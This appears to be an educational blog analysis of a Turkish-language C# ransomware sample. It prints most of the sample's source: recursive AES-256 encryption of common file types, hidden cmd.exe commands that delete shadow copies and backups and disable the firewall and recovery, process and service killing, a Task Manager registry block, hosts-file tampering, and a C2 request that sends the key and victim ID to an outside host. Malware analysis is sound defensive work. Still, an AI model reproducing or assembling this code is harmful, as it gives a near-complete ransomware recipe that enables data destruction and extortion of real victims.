# 🔒 Analyzing a Malicious Ransomware Code in C# 🔍

In this article, we dive into a dangerous piece of C# code designed to function as ransomware. This code encrypts files, disrupts system operations, and leaves ransom notes, showcasing malicious intent. We’ll break down its key components, illustrate each point with the complete relevant code, and highlight the techniques used. **Note**: This analysis is for educational purposes only, and handling such code should be done with extreme caution in a controlled environment.

Below, we’ll structure the article into sections, each focusing on a critical aspect of the ransomware, followed by the full code snippet for clarity.

---

## 🛡️ 1. Overview of the Ransomware’s Functionality

The code is a Windows Forms application (`Form1`) that executes its malicious payload during the `Form1_Load` event. Its primary actions include:

- **Disabling system protections**: It turns off the firewall, deletes shadow copies, and disables recovery options.
- **Encrypting files**: It targets specific file extensions across multiple drives and directories, encrypting them with AES-256.
- **Leaving ransom notes**: It creates `Beni Oku!!!.txt` (Turkish for "Read Me!!!") files with instructions, replacing a placeholder with a unique ID.
- **Disrupting services**: It terminates processes and stops services related to backups, databases, and productivity software.
- **Communicating with a C2 server**: It sends a unique ID and encryption key to a remote server.

Let’s explore each component in detail.

---

## 🔐 2. File Encryption with AES-256

### Functionality
The ransomware encrypts files with specific extensions (e.g., `.txt`, `.docx`, `.jpg`) using AES-256 encryption. The `EncryptDirectory` method recursively scans directories, encrypts matching files, and uses a randomly generated password.

### Code Analysis
The `EncryptDirectory` method iterates through files and subdirectories, checking for target extensions before calling `AES256.EncryptFile`. It handles exceptions silently to avoid detection.

```csharp
public void EncryptDirectory(string location, string password)
{
    try
    {
        string[] source = new string[24]
        {
            ".txt", ".doc", ".docx", ".rar", ".zip", ".xls", ".bin", ".xlsx", ".ppt", ".pptx",
            ".rtf", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp",
            ".aspx", ".html", ".xml", ".psd"
        };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int i = 0; i < files.Length; i++)
        {
            string extension = Path.GetExtension(files[i]);
            if (source.Contains(extension))
            {
                AES256.EncryptFile(files[i], password);
            }
        }
        for (int j = 0; j < directories.Length; j++)
        {
            EncryptDirectory(directories[j], password);
        }
    }
    catch (ArgumentException)
    {
    }
    catch (CryptographicException)
    {
    }
    catch (UnauthorizedAccessException)
    {
    }
    catch (IOException)
    {
    }
}
```

### Observations
- **Targeted Extensions**: The ransomware focuses on common file types, maximizing damage to user data.
- **Recursive Encryption**: It encrypts files in subdirectories, ensuring comprehensive coverage.
- **Silent Error Handling**: Exceptions are caught but not logged, preventing alerts to the user.

---

## 🔓 3. Decryption Capability (Controlled by Attackers)

### Functionality
The `DecryptDirectory` method allows decryption of files with a specific extension (defined in `AES256.EXTENSION`), but it requires the correct password, which is only known to the attackers.

### Code Analysis
Similar to `EncryptDirectory`, it recursively scans for files with the ransomware’s custom extension and attempts decryption.

```csharp
public void DecryptDirectory(string location, string password)
{
    try
    {
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int i = 0; i < files.Length; i++)
        {
            if (Path.GetExtension(files[i]) == AES256.EXTENSION)
            {
                AES256.DecryptFile(files[i], password);
            }
        }
        for (int j = 0; j < directories.Length; j++)
        {
            DecryptDirectory(directories[j], password);
        }
    }
    catch (ArgumentException)
    {
    }
    catch (CryptographicException)
    {
    }
    catch (UnauthorizedAccessException)
    {
    }
    catch (IOException)
    {
    }
}
```

### Observations
- **Controlled Decryption**: Decryption is included but inaccessible to victims without the password.
- **Custom Extension**: Files are marked with a unique extension post-encryption, making them identifiable.

---

## 🛑 4. Disabling System Protections

### Functionality
The ransomware executes a series of `CMDCommand` calls to disable security features, such as the firewall, shadow copies, and recovery options, to prevent restoration of encrypted files.

### Code Analysis
The `CMDCommand` method runs commands via `cmd.exe` with hidden windows to avoid detection.

```csharp
public static void CMDCommand(string cmmnd)
{
    Process process = new Process();
    process.StartInfo = new ProcessStartInfo
    {
        UseShellExecute = false,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = "cmd.exe",
        Arguments = "/C " + cmmnd,
        RedirectStandardError = true,
        RedirectStandardOutput = true
    };
    process.Start();
    process.WaitForExit();
}
```

In `Form1_Load`, it executes commands like:

```csharp
CMDCommand("netsh firewall set opmode disable");
CMDCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
CMDCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
CMDCommand("wbadmin delete catalog -quiet & wbadmin delete systemstatebackup");
```

### Observations
- **Firewall Disabling**: Prevents network-level detection.
- **Shadow Copy Deletion**: Removes Volume Shadow Copies, a common recovery mechanism.
- **Recovery Disabling**: Disables Windows recovery options, locking users out of repair tools.

---

## 📝 5. Creating Ransom Notes

### Functionality
The ransomware creates `Beni Oku!!!.txt` files in multiple directories, containing instructions (likely for paying the ransom). It uses `ReplaceInFile` to insert a unique ID.

### Code Analysis
The `ReplaceInFile` method modifies the ransom note template, and notes are written to key directories.

```csharp
public static void ReplaceInFile(string filePath, string searchText, string replaceText)
{
    StreamReader streamReader = new StreamReader(filePath);
    string input = streamReader.ReadToEnd();
    streamReader.Close();
    input = Regex.Replace(input, searchText, replaceText);
    StreamWriter streamWriter = new StreamWriter(filePath);
    streamWriter.Write(input);
    streamWriter.Close();
}
```

Example usage in `Form1_Load`:

```csharp
if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
{
    string text3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Beni Oku!!!.txt";
    File.WriteAllText(text3, Resources.beni_oku);
    ReplaceInFile(text3, "XXXXXXXXXX", text2);
}
```

### Observations
- **Widespread Note Placement**: Notes are placed in user directories (Desktop, Pictures, etc.) and drives (C:, D:).
- **Unique ID**: The `text2` variable (a 12-character random string) likely serves as a victim identifier for ransom payment.

---

## 🌐 6. Communication with Command-and-Control (C2) Server

### Functionality
The ransomware sends a unique ID and encryption key to a remote server, likely to store decryption keys for ransom negotiations.

### Code Analysis
In `Form1_Load`, it makes an HTTP request:

```csharp
string text = RandomString(150); // Encryption key
string text2 = RandomString(12); // Victim ID
new WebClient().DownloadString("http://zaammmama.tk/SHwLFOP19dHNKMSJ2mXhN92ZcpOcAEz.php?vIrMpaVbm86WzXjtcxEsw4YQ1Syo0B9NvOSuTlKNTsD9ksoe3Y2QTKSWC9sr=ID:_" + text2 + "___Key:___" + text);
```

The `RandomString` method generates these strings:

```csharp
public static string RandomString(int length)
{
    return new string((from s in Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
        select s[random.Next(s.Length)]).ToArray());
}
```

### Observations
- **C2 Server**: The URL suggests a command-and-control server for tracking victims.
- **Data Exfiltration**: The encryption key (`text`) and victim ID (`text2`) are sent, enabling attackers to offer decryption for payment.
- **Obfuscated URL**: The long query string may be an attempt to evade detection.

---

## 🚨 7. Disrupting Processes and Services

### Functionality
The ransomware terminates processes (e.g., Word, Excel, SQL Server) and stops services (e.g., backup and database services) to prevent interference with encryption.

### Code Analysis
In `Form1_Load`, it uses `CMDCommand` to kill processes and stop services:

```csharp
CMDCommand("taskkill /f /im sql.* & taskkill /f /im winword.* & taskkill /f /im wordpad.* & taskkill /f /im outlook.* & taskkill /f /im thunderbird.* & taskkill /f /im oracle.* & taskkill /f /im excel.* & taskkill /f /im onenote.* & taskkill /f /im virtualboxvm.* & taskkill /f /im node.* & taskkill /f /im QBW32.* & taskkill /f /im WBGX.* & taskkill /f /im Teams.* & taskkill /f /im Flow.*");
CMDCommand("net stop DbxSvc & net stop OracleXETNSListener & net stop OracleServiceXE & net stop AcrSch2Svc & net stop AcronisAgent & net stop Apache2.4 & net stop SQLWriter & net stop MSSQL$SQLEXPRESS & net stop MSSQLServerADHelper100 & net stop MongoDB & net stop SQLAgent$SQLEXPRESS & net stop SQLBrowser & net stop CobianBackup11 & net stop cbVSCService11 & net stop QBCFMontorService & net stop QBVSS");
```

### Observations
- **Targeted Disruption**: Focuses on productivity, database, and backup software to maximize impact.
- **Forced Termination**: The `/f` flag in `taskkill` ensures processes are killed without prompts.
- **Service Stoppage**: Stops services like SQL Server and Acronis, which could interfere with encryption.

---

## 🛠️ 8. Registry and Host File Manipulation

### Functionality
The ransomware disables the Task Manager via the registry and modifies the hosts file to block Microsoft validation servers, potentially preventing software updates.

### Code Analysis
In `Form1_Load`:

```csharp
RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
registryKey.SetValue("DisableTaskMgr", "1");
registryKey.Close();

File.Delete("C:\\Windows\\System32\\drivers\\etc\\host");
createtextfilse("C:\\Windows\\System32\\drivers\\etc\\host", "127.0.0.1 validation.sls.microsoft.com");
```

The `createtextfilse` method writes the hosts file:

```csharp
private static void createtextfilse(string filedir, string text)
{
    try
    {
        if (File.Exists(filedir))
        {
            File.Delete(filedir);
        }
        using (FileStream fileStream = File.Create(filedir))
        {
            byte[] bytes = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetBytes(text);
            fileStream.Write(bytes, 0, bytes.Length);
        }
        using StreamReader streamReader = File.OpenText(filedir);
        string text2 = "";
        while ((text2 = streamReader.ReadLine()) != null)
        {
            Console.WriteLine(text2);
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.ToString());
    }
}
```

### Observations
- **Task Manager Disable**: Prevents users from terminating the ransomware process.
- **Hosts File Modification**: Redirects `validation.sls.microsoft.com` to `127.0.0.1`, blocking updates.
- **Error Handling**: The `createtextfilse` method logs errors to the console, which may not be visible to users.

---

## ⚠️ 9. Ethical and Security Considerations

This code is a clear example of ransomware, designed to harm users by locking their data and demanding payment. Key takeaways for developers and security professionals:

- **Code Ethics**: Writing or distributing such code is illegal and unethical.
- **Security Practices**: Regular backups, updated antivirus software, and restricted user permissions can mitigate ransomware risks.
- **Analysis Caution**: Only analyze such code in isolated environments (e.g., virtual machines) to prevent accidental execution.

---

## 🔚 Conclusion

This ransomware code demonstrates a sophisticated attack combining encryption, system disruption, and persistence techniques. By analyzing its components—file encryption, system disabling, ransom note distribution, and C2 communication—we gain insight into how such malware operates. Understanding these mechanisms is crucial for developing defenses and educating users about cybersecurity.

Stay vigilant, keep backups, and never engage with malicious code outside controlled environments! 🛡️

